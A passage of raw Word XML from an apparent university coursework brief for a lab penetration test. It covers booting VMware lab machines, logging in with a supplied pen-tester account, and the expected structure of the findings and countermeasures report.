          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
        <w:t xml:space="preserve">first two machines </w:t>
      </w:r>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
        <w:t xml:space="preserve">machines in the </w:t>
      </w:r>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:b/>
        </w:rPr>
        <w:t>Coursework network</w:t>
      </w:r>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
        <w:t xml:space="preserve"> folder under </w:t>
      </w:r>
      <w:r w:rsidRPr="00BD3626">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:b/>
        </w:rPr>
        <w:t>VMWare workstation</w:t>
      </w:r>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
        <w:t xml:space="preserve"> (see screenshot below). </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
        <w:t>i.e. Y</w:t>
      </w:r>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
        <w:t xml:space="preserve">ou </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
        <w:t xml:space="preserve">should </w:t>
      </w:r>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
        <w:t>boot</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
        <w:t xml:space="preserve"> the</w:t>
      </w:r>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:b/>
        </w:rPr>
        <w:t>Server1</w:t>
      </w:r>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:b/>
        </w:rPr>
        <w:t>Server2</w:t>
      </w:r>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
        <w:t xml:space="preserve"> virtual machines by using the stored </w:t>
      </w:r>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:b/>
        </w:rPr>
        <w:t>snapshot</w:t>
      </w:r>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
        <w:t xml:space="preserve"> named </w:t>
      </w:r>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:b/>
        </w:rPr>
        <w:t>booted.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="000E7F26">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:bCs/>
        </w:rPr>
        <w:t>You must use the Booted snapshot</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> since this is the machine in a running state.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58D603D0" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="002D4859" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="255D1822" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="002D4859" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="78BE5DD9" wp14:editId="3A23487E">
            <wp:extent cx="1544320" cy="10953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44320" cy="1095375"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F739475" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="002D4859" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="101350FB" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="002D4859" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="46"/>
        </w:numPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
        <w:t xml:space="preserve">Then browse to </w:t>
      </w:r>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:b/>
        </w:rPr>
        <w:t>http://192.168.0.1/student</w:t>
      </w:r>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
        <w:t xml:space="preserve"> and select your name. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5016660E" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="002D4859" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0655FBC2" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="002D4859" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="76A0CA95" wp14:editId="1188BAE8">
            <wp:extent cx="3424555" cy="2208530"/>
            <wp:effectExtent l="0" t="0" r="4445"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24555" cy="2208530"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BA7FEB2" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="002D4859" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="66E2B580" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="002D4859" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="46"/>
        </w:numPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
        <w:t>Wait for around 60 seconds until you receive a message informing you that the machine has been set up.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2259CA3E" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="002D4859" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="69B05EB9" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="002D4859" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2E2ED3DF" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E744B" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="46"/>
        </w:numPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
        <w:t xml:space="preserve">You have been provided with a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
        <w:t xml:space="preserve">pen tester </w:t>
      </w:r>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
        <w:t xml:space="preserve">account </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
        <w:t xml:space="preserve">that you can use to log in to </w:t>
      </w:r>
      <w:r w:rsidRPr="000E7F26">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Client2</w:t>
      </w:r>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:b/>
        </w:rPr>
        <w:t>username: test, password: test123.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5582E4BB" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="198DC828" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="000E744B" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="46"/>
        </w:numPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="000E744B">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
        <w:t xml:space="preserve">You should </w:t>
      </w:r>
      <w:r w:rsidRPr="000E744B">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">not </w:t>
      </w:r>
      <w:r w:rsidRPr="000E744B">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
        <w:t xml:space="preserve">log in to Client1. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F44616C" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="002D4859" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2D5A6399" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="002D4859" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
        <w:t>The aim of this assessment is to conduct a penetration test to demonstrate the risks to the company network from a malicious insider, i.e. someone who has plugged a machine into the network or has connected via wireless. You have been paid to do ~2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
        <w:t xml:space="preserve"> hours of investigative work and you should allocate your time accordingly. In addition to conducting the practical work, you should write a report that documents your findings. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FABA5B1" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="002D4859" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="77007195" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="002D4859" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
        </w:rPr>
        <w:t xml:space="preserve">In your report, you should present your methodology, any interesting information that you have found about the state of security of the company network and countermeasures to any vulnerabilities that you may have found. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67124BC0" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:right="84"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:bCs/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="43F0F0DF" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="00B41016" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:right="84"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B41016">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">The report should efficiently describe the practical work you have undertaken in the format of a white paper (a proforma will be supplied). The report should be aimed at the Network Administrator of the company (i.e. they are experienced in Computer Networking and have some knowledge of security) but </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>your report</w:t>
      </w:r>
      <w:r w:rsidRPr="00B41016">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> must be in an academic format.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D5578FA" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="002D4859" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:ind w:right="567"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>As a suggestion, your document should include: -</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="230EB9C2" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:spacing w:after="0"/>
        <w:ind w:left="360" w:right="567"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="06F8FE07" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="002D4859" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="45"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="clear" w:pos="1080"/>
          <w:tab w:val="num" w:pos="360"/>
        </w:tabs>
        <w:spacing w:after="0"/>
        <w:ind w:left="360" w:right="567"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Abstract.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19360F03" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="002D4859" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="45"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="clear" w:pos="1080"/>
          <w:tab w:val="num" w:pos="426"/>
        </w:tabs>
        <w:spacing w:after="0"/>
        <w:ind w:left="360" w:right="567"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Introduction</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49EAAFF8" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="002D4859" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="45"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="clear" w:pos="1800"/>
          <w:tab w:val="num" w:pos="426"/>
          <w:tab w:val="num" w:pos="993"/>
        </w:tabs>
        <w:spacing w:after="0"/>
        <w:ind w:left="1080" w:right="567"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:bCs/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:bCs/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Introduction to the problem.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B6D9AAE" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="002D4859" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="45"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="clear" w:pos="1800"/>
          <w:tab w:val="num" w:pos="426"/>
          <w:tab w:val="num" w:pos="993"/>
        </w:tabs>
        <w:spacing w:after="0"/>
        <w:ind w:left="1080" w:right="567"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:bCs/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:bCs/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Aim of your work.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46D3DA08" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="002D4859" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="45"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="clear" w:pos="1800"/>
          <w:tab w:val="num" w:pos="426"/>
          <w:tab w:val="num" w:pos="993"/>
        </w:tabs>
        <w:spacing w:after="0"/>
        <w:ind w:left="1080" w:right="84"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:bCs/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:bCs/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">A definition of the methodology that you will adopt (define each </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:bCs/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>steps</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:bCs/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> and the tools that you will use). The methodology should be clear.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4860300F" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="002D4859" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="45"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="clear" w:pos="1080"/>
          <w:tab w:val="num" w:pos="426"/>
          <w:tab w:val="num" w:pos="993"/>
        </w:tabs>
        <w:spacing w:after="0"/>
        <w:ind w:left="360" w:right="567"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Procedure and results</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D209068" w14:textId="77777777" w:rsidR="00ED2F72" w:rsidRPr="002D4859" w:rsidRDefault="00ED2F72" w:rsidP="00ED2F72">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="45"/>
        </w:numPr>
        <w:tabs>
          <w:tab w:val="clear" w:pos="1800"/>
          <w:tab w:val="num" w:pos="426"/>
          <w:tab w:val="num" w:pos="993"/>
        </w:tabs>
        <w:spacing w:after="0"/>
        <w:ind w:left="1080" w:right="567"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:bCs/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
          <w:bCs/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>In essence, this</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002D4859">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:cs="Arial"/>
